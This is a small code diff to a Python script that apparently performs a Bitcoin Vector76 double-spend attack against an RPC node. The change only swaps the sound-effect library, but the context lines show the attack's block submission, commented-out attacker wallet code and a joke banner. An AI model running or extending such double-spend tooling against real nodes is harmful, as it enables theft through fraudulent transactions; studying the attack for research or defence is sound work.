@@ -1,4 +1,7 @@
 import sys
+import time
+
+import mp3play
 import bitcoin
 import playsound
 import bitcoin.tests
@@ -8,6 +11,7 @@ from bitcoin_tools.core.transaction import TX
 from bitcoinaddress import Wallet
 from bitcoincli import Bitcoin
 
+clip = mp3play.load("ImagineBreaker.mp3")
 #attacker_temp_wallet = Wallet()
 #sk, pk = load_keys(sys.argv[1])
 rpc_host = sys.argv[1]
@@ -85,9 +89,10 @@ print(f"submitblock {vector76_mining_hash}")
 print()
 result = rpc_node.submitblock(vector76_mining_hash)
 print(result)
-print()
-#おまけ
+print()#おまけ
 print(f"Kamijou Touma >> Kill that blockchain transaction!!")
 print()
-playsound.playsound("ImagineBreaker.mp3") 
+clip.play()
+time.sleep(min(5, clip.seconds()))
+clip.stop()
 print("Done.")
